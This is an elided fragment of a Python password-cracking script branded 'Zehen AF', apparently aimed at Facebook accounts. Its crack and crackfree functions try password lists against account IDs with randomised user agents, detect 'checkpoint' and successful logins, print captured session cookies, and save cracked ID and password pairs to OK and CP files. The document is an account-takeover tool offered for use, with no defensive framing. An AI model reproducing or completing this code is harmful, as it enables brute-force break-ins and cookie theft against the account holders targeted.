...
def back():
    login()
def contact():
   # os.system('xdg-open https://www.facebook.com/zehen.39.Ok.Bro')
    back()
def linex():
    print('\033[1;37m')
def animation(u):
...
#------------------[ LOGO-LAKNAT ]-----------------#
logo="""
\033[1;32m__________ _   _ _____ _   _         _    _____ 
\033[1;32m|__  | ____| | | | ____| \ | |       / \  |  ___|
\033[1;32m  / /|  _| | |_| |  _| |  \| |_____ / _ \ | |_   
\033[1;32m / /_| |___|  _  | |___| |\  |_____/ ___ \|  _|  
\033[1;32m/____|_____|_| |_|_____|_| \_|    /_/   \_|_|    ❵\x1b[1;92m═━═━═━━═━━═━═━━══\x1b[1;91m"""
os.system('clear')
print(logo)
#os.system('espeak -a 300 " Your,   Real,  Name,"')
#uname =input('\033[1;97m[\033[1;92m•\033[1;97m]\033[1;92m WHAT IS YOUR NAME \033[1;91m: \33[1;32m')
#os.system('espeak -a 300 " Welcome,   to,  Zehen,  Af,  Tools"')
pass
...
def setting():
    ...
    #os.system("xdg-open https://www.facebook.com/tohid.39.King.Ok.Bro")
    if hc in ['1','01']:
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}[Zehen•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;94m[Zehen-Cp] {idf} • {pw}')
                ...
                print(f'\r\033[0;92m[Zehen-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
                os.system('espeak -a 300 " Zehen,  Ok,  id"')
...
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}[Zehen-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;95m[{time.strftime("%H:%M")}•Zehen-Cp] {idf} • {pw}')
                os.system('espeak -a 300 " Cp,"')
                open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•Zehen-Ok] {idf} • {pw} ')
                os.system('espeak -a 300 " Ok,  Zehen,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
